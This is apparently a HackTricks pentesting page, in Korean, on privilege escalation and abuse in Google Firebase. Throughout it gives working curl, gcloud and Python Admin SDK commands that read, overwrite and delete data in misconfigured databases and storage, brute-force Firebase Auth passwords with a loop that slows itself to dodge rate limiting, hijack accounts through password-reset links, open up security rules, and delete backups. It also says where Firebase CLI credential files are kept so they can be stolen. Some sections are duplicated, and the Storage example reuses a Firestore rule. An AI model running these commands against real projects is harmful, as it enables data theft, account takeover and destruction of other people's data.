# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Firebase Realtime Database에 대한 인증되지 않은 접근
공격자는 이 공격을 수행하기 위해 특정 Firebase 권한을 필요로 하지 않습니다. 이 공격은 Firebase Realtime Database 보안 규칙에서 `.read: true` 또는 `.write: true`로 설정되어 공개 읽기/쓰기 접근을 허용하는 취약한 구성만 있으면 됩니다.

공격자는 일반적으로 형식이 `https://<project-id>.firebaseio.com/`인 데이터베이스 URL을 식별해야 합니다.

이 URL은 모바일 애플리케이션 역공학(안드로이드 APK 디컴파일 또는 iOS 앱 분석), google-services.json(Android) 또는 GoogleService-Info.plist(iOS)와 같은 구성 파일 분석, 웹 애플리케이션 소스 코드 검사, 또는 네트워크 트래픽을 검사해 `*.firebaseio.com` 도메인으로의 요청을 식별하는 방식으로 찾을 수 있습니다.

공격자는 데이터베이스 URL을 확인해 공개적으로 노출되어 있는지 검사한 다음 데이터를 읽고 경우에 따라 악의적인 내용을 쓸 수 있습니다.

먼저 URL에 .json을 붙여 데이터베이스가 읽기 접근을 허용하는지 확인합니다.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
응답이 JSON 데이터나 null("Permission Denied" 대신)을 포함하면, 데이터베이스는 읽기 액세스를 허용한다. 쓰기 액세스를 확인하려면 공격자가 Firebase REST API를 사용해 테스트 쓰기 요청을 전송해 볼 수 있다.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
작업이 성공하면 데이터베이스는 쓰기 접근도 허용합니다.

### Cloud Firestore의 데이터 노출
공격자가 이 공격을 수행하기 위해 특정 Firebase 권한을 필요로 하지 않습니다. 이 공격은 Cloud Firestore 보안 규칙이 인증 없이 또는 검증이 불충분하게 읽기 또는 쓰기 접근을 허용하도록 취약하게 구성되어 있는 것만으로 발생합니다. 전체 접근을 허용하는 잘못 구성된 규칙의 예는 다음과 같습니다:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
이 규칙은 누구나 모든 문서를 아무런 제약 없이 읽고 쓸 수 있도록 허용합니다. Firestore rules는 세분화되어 컬렉션 및 문서별로 적용되므로, 특정 규칙의 오류는 일부 컬렉션만 노출될 수 있습니다.

공격자는 Firebase 프로젝트 ID를 식별해야 하며, 이는 모바일 앱 reverse engineering, google-services.json 또는 GoogleService-Info.plist와 같은 구성 파일 분석, 웹 애플리케이션 소스 코드 조사, 또는 firestore.googleapis.com으로의 요청을 식별하기 위한 네트워크 트래픽 분석을 통해 찾을 수 있습니다.
The Firestore REST API uses the format:
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
규칙이 인증되지 않은 읽기 액세스를 허용하면, attacker는 collections와 documents를 읽을 수 있다. 먼저 특정 collection에 접근을 시도한다:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
응답이 권한 오류 대신 JSON 문서를 포함한다면, 해당 컬렉션은 노출된 것입니다. 공격자는 일반적인 이름을 시도하거나 애플리케이션의 구조를 분석하여 접근 가능한 모든 컬렉션을 열거할 수 있습니다. 특정 문서에 접근하려면:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
규칙이 인증되지 않은 쓰기 접근을 허용하거나 검증이 불충분한 경우, 공격자는 새 문서를 생성할 수 있습니다:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
기존 문서를 수정하려면 PATCH를 사용해야 합니다:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
문서를 삭제하여 서비스 거부(DoS)를 발생시키려면:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Firebase Storage에서 파일 노출
공격자는 이 공격을 수행하기 위해 특정 Firebase 권한이 필요하지 않습니다. 이는 Firebase Storage의 보안 규칙에서 인증 없이 또는 불충분한 검증으로 읽기 또는 쓰기 액세스를 허용하는 취약한 구성만 있으면 됩니다. Storage 규칙은 읽기 및 쓰기 액세스를 독립적으로 제어하므로, 규칙의 오류로 인해 읽기 액세스만 노출되거나 쓰기 액세스만 노출되거나 둘 다 노출될 수 있습니다. 전체 액세스를 허용하는 잘못 구성된 규칙의 예는 다음과 같습니다:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
이 규칙은 모든 문서에 대해 아무런 제한 없이 read and write access를 허용합니다. Firestore 규칙은 세분화되어 컬렉션별 및 문서별로 적용되므로 특정 규칙의 오류는 일부 컬렉션만 노출될 수 있습니다. 공격자는 Firebase Project ID를 식별해야 하며, 이는 mobile application reverse engineering, google-services.json 또는 GoogleService-Info.plist와 같은 구성 파일 분석, 웹 애플리케이션 소스 코드 검사, 또는 firestore.googleapis.com으로의 요청을 식별하기 위한 네트워크 트래픽 분석을 통해 찾을 수 있습니다.
The Firestore REST API uses the format:`https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

규칙이 unauthenticated read access를 허용하면 공격자는 컬렉션과 문서를 읽을 수 있습니다. 우선 특정 컬렉션에 접근을 시도합니다.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
응답이 권한 오류 대신 파일 목록을 포함하고 있다면, 해당 파일은 노출된 것입니다. 공격자는 파일 경로를 지정하여 파일의 내용을 볼 수 있습니다:
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
규칙이 인증되지 않은 쓰기 액세스를 허용하거나 검증이 불충분한 경우, 공격자는 악성 파일을 업로드할 수 있습니다. REST API를 통해 파일을 업로드하려면:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
공격자는 code shells, malware payloads 또는 대용량 파일을 업로드하여 denial of service를 야기할 수 있습니다. 애플리케이션이 업로드된 파일을 처리하거나 실행하면 공격자는 remote code execution을 달성할 수 있습니다. 파일을 삭제하고 denial of service를 일으키려면:
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### 공개된 Firebase Cloud Functions 호출
공격자는 이 문제를 악용하기 위해 특정 Firebase 권한이 필요하지 않습니다; 인증 없이 HTTP를 통해 Cloud Function에 공개적으로 액세스할 수 있으면 됩니다.

함수가 다음과 같이 안전하지 않게 구성된 경우 취약합니다:

- functions.https.onRequest를 사용하며, 이는 인증을 강제하지 않습니다 (onCall functions와는 달리).
- 함수의 코드가 사용자 인증을 검증하지 않습니다(예: request.auth 또는 context.auth에 대한 검사 없음).
- 해당 함수가 IAM에서 공개적으로 접근 가능하며, 즉 allUsers가 roles/cloudfunctions.invoker 역할을 갖고 있는 경우입니다. 이는 개발자가 접근을 제한하지 않으면 HTTP 함수의 기본 동작입니다.

Firebase HTTP Cloud Functions는 다음과 같은 URL을 통해 노출됩니다:

- https://<region>-<project-id>.cloudfunctions.net/<function-name>
- https://<project-id>.web.app/<function-name> (Firebase Hosting과 통합된 경우)

공격자는 소스 코드 분석, 네트워크 트래픽 검사, enumeration tools, 또는 모바일 앱 reverse engineering을 통해 이러한 URL을 발견할 수 있습니다.  
함수가 공개적으로 노출되어 있고 인증이 없으면 공격자는 자격 증명 없이 직접 해당 함수를 호출할 수 있습니다.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
If the function does not properly validate inputs, the attacker may attempt other attacks such as code injection or command injection.


### Brute-force attack against Firebase Authentication with a weak password policy
공격자는 이 공격을 수행하기 위해 특정 Firebase 권한이 필요하지 않다. 이 공격에는 Firebase API Key가 모바일 또는 웹 애플리케이션에 노출되어 있고, 비밀번호 정책이 기본값보다 엄격하게 구성되어 있지 않은 것만 필요하다.

공격자는 Firebase API Key를 식별해야 하며, 이는 모바일 앱 리버스 엔지니어링, google-services.json 또는 GoogleService-Info.plist와 같은 구성 파일 분석, 웹 애플리케이션의 소스 코드 검사(예: bootstrap.js), 또는 네트워크 트래픽 분석을 통해 발견할 수 있다.

Firebase Authentication’s REST API uses the endpoint:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`
to authenticate with email and password.

If Email Enumeration Protection is disabled, API error responses can reveal whether an email exists in the system (EMAIL_NOT_FOUND vs. INVALID_PASSWORD), which allows attackers to enumerate users before attempting password guessing. When this protection is enabled, the API returns the same error message for both nonexistent emails and incorrect passwords, preventing user enumeration.

Firebase Authentication은 레이트 리미팅을 적용하므로 짧은 시간에 인증 시도가 너무 많으면 요청을 차단할 수 있다는 점에 유의해야 한다. 이 때문에 공격자는 레이트 제한에 걸리지 않기 위해 시도 사이에 지연을 도입해야 한다.

공격자는 API Key를 식별한 후 알려진 계정들에 대해 여러 비밀번호로 인증 시도를 수행한다. Email Enumeration Protection이 비활성화되어 있으면, 공격자는 오류 응답을 분석하여 존재하는 사용자를 열거할 수 있다:
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
응답에 EMAIL_NOT_FOUND가 포함되어 있으면 해당 이메일은 시스템에 존재하지 않습니다. INVALID_PASSWORD가 포함되어 있으면 이메일은 존재하지만 비밀번호가 틀려 사용자가 등록되어 있음을 확인할 수 있습니다. 유효한 사용자가 확인되면 공격자는 brute-force 시도를 수행할 수 있습니다. Firebase Authentication의 rate-limiting 메커니즘을 피하려면 시도 사이에 일시 중지를 포함하는 것이 중요합니다:
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
With the default password policy (minimum 6 characters, no complexity requirements), the attacker can try all possible combinations of 6-character passwords, which represents a relatively small search space compared to stricter password policies.

### Firebase Authentication에서의 사용자 관리

공격자는 이 공격을 수행하기 위해 특정 Firebase Authentication 권한이 필요합니다. 필요한 권한은 다음과 같습니다:

- `firebaseauth.users.create` — 사용자 생성
- `firebaseauth.users.update` — 기존 사용자 수정
- `firebaseauth.users.delete` — 사용자 삭제
- `firebaseauth.users.get` — 사용자 정보 조회
- `firebaseauth.users.sendEmail` — 사용자에게 이메일 전송
- `firebaseauth.users.createSession` — 사용자 세션 생성

이 권한들은 Firebase Authentication 리소스에 대한 읽기/쓰기 전체 액세스를 부여하는 `roles/firebaseauth.admin` 역할에 포함되어 있습니다. 또한 모든 firebaseauth.* 권한을 포함하는 roles/firebase.developAdmin와 Firebase의 모든 서비스에 대한 전체 액세스를 제공하는 roles/firebase.admin 같은 상위 권한 역할에도 포함되어 있습니다.

Firebase Admin SDK를 사용하려면 공격자는 서비스 계정 자격증명(JSON 파일)에 접근할 수 있어야 합니다. 이러한 자격증명은 침해된 시스템, 공개된 코드 저장소, 침해된 CI/CD 시스템, 또는 해당 자격증명에 접근 권한이 있는 개발자 계정의 침해를 통해 발견될 수 있습니다.

첫 번째 단계는 서비스 계정 자격증명(JSON 파일)을 사용해 Firebase Admin SDK를 구성하는 것입니다.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
피해자의 이메일을 사용해 악성 사용자를 만들기 위해, 공격자는 Firebase Admin SDK를 사용해 해당 이메일로 새 계정을 생성하려고 시도할 것입니다.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
기존 사용자를 수정하려면 공격자는 이메일 주소, 인증 상태 또는 계정 비활성화 여부와 같은 필드를 업데이트할 수 있습니다.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
사용자 계정을 삭제하고 denial of service를 초래하려면 공격자는 해당 사용자를 완전히 제거하는 요청을 전송합니다.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
공격자는 UID나 email address를 요청하여 기존 사용자에 대한 정보를 가져올 수도 있다.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
또한 공격자는 verification links 또는 password-reset links를 생성하여 사용자의 비밀번호를 변경하고 해당 계정에 접근할 수 있습니다.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Firebase Authentication에서의 사용자 관리
공격자가 이 공격을 수행하려면 특정 Firebase Authentication 권한이 필요합니다. 필요한 권한은 다음과 같습니다:

- `firebaseauth.users.create` — 사용자 생성
- `firebaseauth.users.update` — 기존 사용자 수정
- `firebaseauth.users.delete` — 사용자 삭제
- `firebaseauth.users.get` — 사용자 정보 조회
- `firebaseauth.users.sendEmail` — 사용자에게 이메일 발송
- `firebaseauth.users.createSession` — 사용자 세션 생성

이 권한들은 roles/firebaseauth.admin 역할에 포함되어 있으며, Firebase Authentication 리소스에 대한 전체 읽기/쓰기 액세스를 부여합니다. 또한 `roles/firebase.developAdmin`(모든 firebaseauth.* 권한 포함) 및 `roles/firebase.admin`(모든 Firebase 서비스에 대한 전체 액세스)과 같은 상위 역할의 일부이기도 합니다.

Firebase Admin SDK를 사용하려면 공격자는 서비스 계정 자격증명(JSON 파일)에 접근할 수 있어야 하며, 이는 침해된 시스템, 공개된 코드 저장소, 침해된 CI/CD 환경 또는 해당 자격증명에 접근 권한이 있는 개발자 계정의 침해를 통해 얻을 수 있습니다.

첫 번째 단계는 서비스 계정 자격증명을 사용하여 Firebase Admin SDK를 구성하는 것입니다.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
victim’s email을 사용해 malicious user를 생성하려면, attacker는 해당 이메일로 새 사용자 계정을 만들고 자신의 password와 profile information을 설정하려고 시도할 것이다.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
기존 사용자를 수정하려면 공격자는 이메일 주소, 인증 상태, 또는 계정이 비활성화되었는지 여부와 같은 필드를 변경한다.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
사용자 계정을 삭제하려면—실질적으로 denial of service를 초래하는—공격자는 해당 사용자를 영구히 제거하도록 요청을 전송합니다.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
공격자는 UID나 email 주소로 사용자 세부 정보를 요청하여 UID나 email과 같은 기존 사용자 정보를 가져올 수도 있다.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
또한, 공격자는 verification links 또는 password-reset links를 생성하여 사용자의 비밀번호를 변경하고 계정을 장악할 수 있다.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Firebase 서비스에서 보안 규칙 수정
공격자는 서비스에 따라 보안 규칙을 수정하기 위해 특정 권한이 필요합니다. Cloud Firestore 및 Firebase Cloud Storage의 경우, rulesets을 생성하기 위한 `firebaserules.rulesets.create` 권한과 릴리스를 배포하기 위한 `firebaserules.releases.create` 권한이 필요합니다. 이 권한들은 `roles/firebaserules.admin` 역할 또는 `roles/firebase.developAdmin`, `roles/firebase.admin` 같은 상위 역할에 포함되어 있습니다. Firebase Realtime Database의 경우에는 `firebasedatabase.instances.update` 권한이 필요합니다.

공격자는 보안 규칙을 수정하기 위해 Firebase REST API를 사용해야 합니다.
먼저, 공격자는 service account credentials를 사용하여 access token을 획득해야 합니다.
토큰을 얻기 위해:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Firebase Realtime Database 규칙을 수정하려면:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Cloud Firestore 규칙을 수정하려면 공격자는 먼저 ruleset을 생성한 다음 배포해야 합니다:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
이전 명령은 projects/<project-id>/rulesets/<ruleset-id> 형식의 ruleset 이름을 반환합니다. 새 버전을 배포하려면 PATCH 요청을 사용해 release를 업데이트해야 합니다:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Firebase Cloud Storage 규칙을 수정하려면:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
이전 명령은 projects/<project-id>/rulesets/<ruleset-id> 형식의 ruleset 이름을 반환합니다. 새 버전을 배포하려면 release를 PATCH 요청으로 업데이트해야 합니다:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Cloud Firestore에서의 데이터 유출 및 조작
Cloud Firestore는 Cloud Datastore와 동일한 인프라 및 권한 시스템을 사용하므로 Datastore IAM permissions가 Firestore에 직접 적용됩니다. TTL 정책을 조작하려면 `datastore.indexes.update` 권한이 필요합니다. 데이터를 내보내려면 `datastore.databases.export` 권한이 필요합니다. 데이터를 가져오려면 datastore.databases.import 권한이 필요합니다. 대량 데이터 삭제를 수행하려면 `datastore.databases.bulkDelete` 권한이 필요합니다.

백업 및 복원 작업에는 다음과 같은 특정 권한이 필요합니다:

- `datastore.backups.get` and `datastore.backups.list` — 사용 가능한 백업을 나열하고 세부 정보를 조회하려면
- `datastore.backups.delete` — 백업을 삭제하려면
- `datastore.backups.restoreDatabase` — 백업에서 데이터베이스를 복원하려면
- `datastore.backupSchedules.create` and `datastore.backupSchedules.delete` — 백업 스케줄을 관리하려면

TTL 정책이 생성되면 삭제 대상이 될 엔터티를 식별하기 위해 지정된 속성이 선택됩니다. 이 TTL 속성은 Date and time 타입이어야 합니다. 공격자는 이미 존재하는 속성을 선택하거나 나중에 추가할 속성을 지정할 수 있습니다. 필드의 값이 과거의 날짜이면 문서는 즉시 삭제 대상이 됩니다. 공격자는 gcloud CLI를 사용해 TTL 정책을 조작할 수 있습니다.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
공격자는 데이터를 내보내고 exfiltrate하기 위해 gcloud CLI를 사용할 수 있다.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
악성 데이터를 가져오려면:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
대량 데이터 삭제를 수행하고 denial of service를 유발하기 위해, 공격자는 gcloud Firestore bulk-delete 도구를 사용하여 전체 컬렉션을 제거할 수 있다.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
백업 및 복원 작업에서 공격자는 데이터베이스의 현재 상태를 캡처하기 위해 예약된 백업을 생성하고, 기존 백업을 나열하며, 최근 변경사항을 덮어쓰기 위해 백업에서 복원하고, 영구적인 데이터 손실을 초래하기 위해 백업을 삭제하고, 예약된 백업을 제거할 수 있습니다.

즉시 백업을 생성하는 일일 백업 스케줄을 생성하려면:
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
특정 백업에서 복원하려면 공격자는 해당 백업에 포함된 데이터를 사용해 새 데이터베이스를 생성할 수 있다. 복원 작업은 백업의 데이터를 새 데이터베이스에 기록하므로 기존 DATABASE_ID를 사용할 수 없다.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
백업을 삭제하여 영구적인 데이터 손실을 발생시키려면:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Firebase CLI credentials의 도난 및 오용
공격자는 이 공격을 수행하기 위해 특정 Firebase 권한이 필요하지 않지만, 개발자의 로컬 시스템이나 Firebase CLI 자격 증명 파일에 대한 접근 권한은 필요합니다. 이 자격 증명은 다음 위치에 있는 JSON 파일에 저장됩니다:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

이 파일에는 refresh_token과 access_token을 포함한 인증 토큰이 들어있으며, 이를 통해 공격자는 원래 firebase login을 실행한 사용자로 인증할 수 있습니다.

공격자가 Firebase CLI 자격 증명 파일에 접근하면, 해당 파일 전체를 자신의 시스템으로 복사할 수 있고, Firebase CLI는 기본 위치의 자격 증명을 자동으로 사용합니다. 그렇게 하면 공격자는 그 사용자가 접근 가능한 모든 Firebase 프로젝트를 볼 수 있습니다.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
